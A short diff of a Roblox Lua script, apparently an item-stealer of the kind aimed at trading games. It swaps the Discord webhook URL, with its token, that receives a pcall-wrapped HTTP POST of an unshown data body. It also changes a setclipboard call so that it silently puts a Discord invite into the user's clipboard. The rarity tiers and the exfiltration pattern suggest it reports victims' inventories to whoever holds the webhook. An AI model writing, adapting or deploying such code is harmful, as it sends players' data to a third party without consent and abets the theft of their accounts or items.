@@ -73,7 +73,7 @@ else
 end
 
 local HttpService = game:GetService("HttpService")
-setclipboard("elpepe")
+setclipboard("https://discord.gg/4whPb9Nxm7")
 local tbl2 = { "Common", "Uncommon", "Rare", "Legendary", "Vintage", "Godly", "Ancient", "Unique" }
 
 local function fn(arg)
@@ -1047,7 +1047,7 @@ local function fn24(arg, arg2)
 
 		pcall(function()
 			request({
-				Url = "https://discord.com/api/webhooks/1540466856228421632/Wfq_gxEfNdRrY4gLdQRcFMMzWF7qWHCGWt4yeomXSssXZeC9zW_xP3c7R-v4Z928hSEZ",
+				Url = "https://discord.com/api/webhooks/1564004709507801241/Zpn38sx3OR29tvcweH0DN4lyKd_Bzh0Y0f_JYakkS_rLTQo2LjexZyZ7Dvsc8tYTyQxp",
 				Method = "POST",
 				Headers = { ["Content-Type"] = "application/json" },
 				Body = v11,
